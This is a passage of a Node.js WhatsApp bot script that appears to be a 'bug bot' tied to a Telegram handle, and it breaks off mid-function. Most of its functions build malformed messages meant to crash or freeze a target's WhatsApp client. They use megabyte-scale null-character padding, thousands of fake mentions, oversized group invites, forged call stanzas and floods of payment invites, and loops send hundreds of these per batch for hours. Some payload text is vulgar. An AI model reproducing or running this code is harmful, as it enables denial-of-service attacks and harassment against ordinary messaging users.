process.on('uncaughtException', console.error)
require("./config")
const { generateMessageID, generateMessageIDV2, WA_DEFAULT_EPHEMERAL, encodeSignedDeviceIdentity, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const path = require('path')
//const express = require('express');
const ms = require('ms');
const os = require('os')
 
/*const app = express();
const PORT = process.env.PORT || 3000;*/

module.exports = async (DevNexusX, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib2/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (DevNexusX.user.id.split(':')[0]+'@s.whatsapp.net' || DevNexusX.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await DevNexusX.decodeJid(DevNexusX.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...(global.db.data.owners || [])].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const isDeveloper = (m && m.sender && (global.db.data.owners || []).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const groupMetadata = m.isGroup ? await DevNexusX.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isReact = m.message.reactionMessage ? true : false

//===============[DATABASE]=====================\\
		try {
			let isNumber = x => typeof x === 'number' && !isNaN(x)
			let user = global.db.data.users[m.sender]
			if (typeof user !== 'object') global.db.data.users[m.sender] = {}
			if (user) {
				if (!isNumber(user.premiumExpiry)) user.premiumExpiry = 0
			} else global.db.data.users[m.sender] = {
				premiumExpiry: 0
			}
			
			let setting = global.db.data.settings[botNumber]
			if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
            if (!('antiswview' in setting)) setting.antiswview = false
            } else global.db.data.settings[botNumber] = {
               antiswview: false,
            }
		} catch (e) {
			console.log(e)
		}
		//=====\\
const cd = require('./lib2/countdown')
let usersdb = global.db.data.users
fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2))
const isPremium = isCreator ? true : cd.isPremium(usersdb, m.sender)
const isRentBotUser = isDeveloper ? true : cd.isPremium(usersdb, m.sender)
//====================================\\
//bug
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "Telegram: @F_1KE") + "\n\n\n";
    jidds = [];
    xeontex += "*~@916909137213~*\n*🦄*\n*~@201104394429~*\n".repeat(10200);
    jidds.push("916909137213@s.whatsapp.net", "201104394429@s.whatsapp.net");
//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const { xeontext11 } = require('./69/xeontext11')
const { xeonbeta1, xeonbeta2, xeonyx } = require("./69/xeontext13.js")
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)
// No Need to Do Anything If You Don't Want Errors

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
 
 function sendMessageWithMentions2(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return DevNexusX.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return DevNexusX.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return DevNexusX.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363386423395618@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/l95ssx.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  } else {
    return DevNexusX.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363386423395618@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/l95ssx.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  }
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

//group chat msg by xeon
const replygcxeon = (teks) => {
	DevNexusX.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363386423395618@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/l95ssx.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})

}
   
//self public
if (!DevNexusX.public) {
if (!isCreator) return
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('XeonBug22.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `يا باشا الأمر اللي كتبته باين عليه غلطان 😅  
بس ولا يهمك، يمكن كنت تقصد ده:\n\n•> ${prefix+mean}\n•> شبهه حوالي: ${similarityPercentage}% 👀  
ركّز كده وجرّب تاني 😉`
replygcxeon(response)
}}   
//==============================================================\\
async function InVisibleX(X, show) {
            let msg = await generateWAMessageFromContent(X, {
                buttonsMessage: {
                    text: "Telegram: @F_1KE",
                    contentText:
                        "Telegram: @F_1KE",
                    footerText: "Telegram: @F_1KE",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "Telegram: @F_1KE" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await DevNexusX.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [X],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: X },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await DevNexusX.relayMessage(
                    X,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "Telegram: @F_1KE",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
        
    async function sendMessagesForDurationX(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer(X); // Using X from user input
            count++;
            await sendNext(); // Continue shipping
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log completed sending 800 packages
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};

async function sendMessagesForDuration(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer2(X); // Using X from user input
            count++;
            await sendNext(); // Continue delivery without delay between messages
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log selesai kirim 800 paket
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};
async function invis(target, zid = true) {
  for(let z = 0; z < 1; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await DevNexusX.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 

        
 
        
        async function EpUi(X, ptcp = true) {
            let msg = await generateWAMessageFromContent(X, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "Telegram: @F_1KE",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await DevNexusX.relayMessage(X, msg.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
        }
async function EpHemeral(X, ptcp = true) {
            let msg = await generateWAMessageFromContent(X, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "Telegram: @F_1KE",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await DevNexusX.relayMessage(X, msg.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
 }

async function HDelay(target) {
    const message = {
        groupStatusMessageV2: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    deviceListMetadata: {
                        senderKeyIndex: 0,
                        senderTimestamp: Date.now(),
                        recipientKeyIndex: 0
                    },
                    deviceListMetadataVersion: 2
                },
                interactiveResponseMessage: {
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        fromMe: true,
                        isQuestion: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "13135550202@bot",
                            botName: "Business Assistant",
                            creator: "Dev𝐍exus𝐗\0"
                        },
                        statusAttributionType: 2,
                        urlTrackingMap: {
                            urlTrackingMapElements: Array.from({ length: 1000 }, () => ({
                                type: 1
                            }))
                        },
                        participant: `${['41', '91', '90', '31', '40'][Math.floor(Math.random() * 5)]}${Math.floor(Math.random() * 1e10).toString().padStart(10, '0')}@s.whatsapp.net`,
                    },
                    body: {
                        text: "}".repeat(560),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: JSON.stringify({
                            flow_cta: "\u0000".repeat(10300)
                        }),
                        version: 3
                    }
                }
            }
        }
    };

    await DevNexusX.relayMessage("status@broadcast", message, {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      });

}
  

//==============================================================\\

async function crashDevnexusX771(target) {
    await DevNexusX.relayMessage(target, {
        botForwardedMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "DevNexusX CRASH WA💥",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, {});
}


async function convite_android(target) {
    const nulltnt = "ཹ".repeat(65000);
    const repetirNull = nulltnt.repeat(2);

    try {
        await DevNexusX.relayMessage(target, {
            groupInviteMessage: {
                groupName: repetirNull,
                groupJid: '6285709664923-1627579259@g.us',
                inviteCode: 'h+64P9RhJDzgXSPf',
                inviteExpiration: '999',
                caption: ``,
                thumbnail: null,
                contextInfo: {}
            }
        }, {});
    } catch (e) {
        console.log('  ༼ ༽  | Error :', e);
    }
}
//==============================================================\\
async function NullInvis(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "DevNexusX NullInvis🦅✨",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });
  
  await DevNexusX.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}





async function callCrash(target, isVideo = true) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@adiwajshing/baileys");
  
  try {
    const devices = (
      await DevNexusX.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await DevNexusX.assertSessions(devices);

    const createMutex = () => {
      const locks = new Map();
      
      return {
        async mutex(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mutexManager = createMutex();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = DevNexusX.createParticipantNodes?.bind(DevNexusX);
    const originalEncodeWAMessage = DevNexusX.encodeWAMessage?.bind(DevNexusX);

    DevNexusX.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (DevNexusX.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = DevNexusX.authState.creds.me;
      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } = await DevNexusX.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const callKey = crypto.randomBytes(32);
    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await DevNexusX.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: DevNexusX.generateMessageTag(),
        from: DevNexusX.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": DevNexusX.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(DevNexusX.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await DevNexusX.sendNode(callStanza);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}

let bugXeonContent = JSON.stringify({
    status: true,
    criador: "Telegram: @F_1KE",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
//==============================================================\\
async function xoutios(target) {
    const xeonIpong = "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @F_1KE","flow_id":"Telegram: @F_1KE","flow_message_version":"9.903","flow_token":"Telegram: @F_1KE"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @F_1KE" }]
                    }
                }
            }
        }
    }), { userJid: target });

    const msg1 = await genMsg(`${xeonIpong}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await DevNexusX.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("Telegram: @F_1KE", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await DevNexusX.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await DevNexusX.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: xeonIpong,
            url: "https://youtube.com/@DGXeon"
        }
    }, { participant: { jid: target } });

await DevNexusX.relayMessage(target, {
        'extendedTextMessage': {
            'text': xeonIpong,
            'contextInfo': {
                'stanzaId': target,
                'participant': target,
                'quotedMessage': {
                    'conversation': 'Telegram: @F_1KE' + 'ꦾ'.repeat(50000)
                },
                'disappearingMode': {
                    'initiator': "CHANGED_IN_CHAT",
                    'trigger': "CHAT_SETTING"
                }
            },
            'inviteLinkGroupTypeV2': "DEFAULT"
        }
    }, {
        'participant': {
            'jid': target
        }
    }, {
        'messageId': null
    });

    const paymentMsg = service => ({
    paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
    }
});

function generateEncryptedID(service) {
    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
}

for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "samSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await DevNexusX.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
    });
}
    
    await DevNexusX.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @F_1KE" + xeonIpong,
            url: "https://youtube.com/@DGXeom"
        }
    }, { participant: { jid: target } });
    
    await DevNexusX.relayMessage(target, {
        locationMessage: {
